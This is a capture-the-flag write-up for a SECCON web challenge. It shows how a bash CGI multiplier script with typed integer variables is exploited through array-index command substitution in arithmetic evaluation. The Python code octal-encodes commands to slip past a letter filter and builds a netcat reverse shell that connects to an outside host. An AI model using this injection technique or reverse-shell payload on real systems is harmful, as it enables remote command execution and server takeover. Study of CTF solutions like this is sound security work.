# Multiplicater (web, 457p, 10 solved)

In the challenge we get access to a [cgi script](index.cgi).

The script is not very complex:

- It sets the variables var1 and var2 to be integer (yes, bash can have types variables!)
- It reads POST parameters we send via HTTP form, splits them with `awk` to extract the values
- Then it decodes urlencode
- Then it filters all letters from the input
- Finally it performs `bash arithmetic evaluation` of `var1 * var2`

```bash
typeset -i var1
typeset -i var2

POST_STRING=$(cat)

var1="$(echo $POST_STRING|awk -F'&' '{print $1}'|awk -F'=' '{print $2}'| nkf -w --url-input|tr -d a-zA-Z)"
var2="$(echo $POST_STRING|awk -F'&' '{print $2}'|awk -F'=' '{print $2}'| nkf -w --url-input|tr -d a-zA-Z)"

echo  "$var1" '*' "$var2 = $((var1 * var2))"
```

We don't know where the flag is, so we need an actual RCE here.

First issue here is that `tr -d a-zA-Z` removes all letters, so any payload we send has to be free of those.
This is not terrible if we can evaluate things like `$'\101'` in bash, because they will be interpolated to letters.

Another issue is that `var1` and `var2` upon assignment will be evaluated and casted to int.
Anything that is not a valid int will result in `0`.
This means that we can't really "leak" much with the last echo, because it will `always` result in integer, and it's inputs will always be integers.

This leaves us with not much space at all, we somehow need to gain RCE with `var1="$(echo SOMETHING)"`

This assignment, since the variable is typed, performs `arithmetic evaluation` before the assignment.
If we read the documentation, it `claims` thar such evaluation does perform shell expansion and variable substitution, however if we try to send a simple sanity check like `$$` as variable value, it doesn't actually work.

It took us a while, and actually someone reading through bash source code of the evaluation, to find out that there is a very special case for `evaluating array index` which is far more powerful!
I fact it provides full RCE there.

For example we can't do:

```bash
typeset -i var1
x='$(touch hacked)'
var1="$(echo $x)"
```

But we can do:

```bash
typeset -i var1
x='__[$(touch hacked)]'
var1="$(echo $x)"
```
And it actually works :)

With this it's pretty clear what to do, we just need to place a reverse-shell in such payload.
Remeber we can't use `a-zA-Z` but as mentioned earlier, we can easily bypass this:

```python
def encode(string):
    x = ["$'\\" + str(oct(ord(c)))[1:] + "'" for c in string]
    return "".join(x)
```

With this we can simply run:

```python
def main():
    echo = encode("echo")
    bash = encode("bash")
    payload = encode("nc tailcall.net 6666 | bash | nc tailcall.net 7777")
    pattern = "__[$(%s %s|%s)]" % (echo, payload, bash)
    print(pattern)


main()
```

Keep in mind the browser will encode the space in `%s %s|%s` to `+` when sending POST, so you should actually send it by hand to avoid this!

Finally connect to the target server to get the flag: `SECCON{Did_you_calculate_it?}`
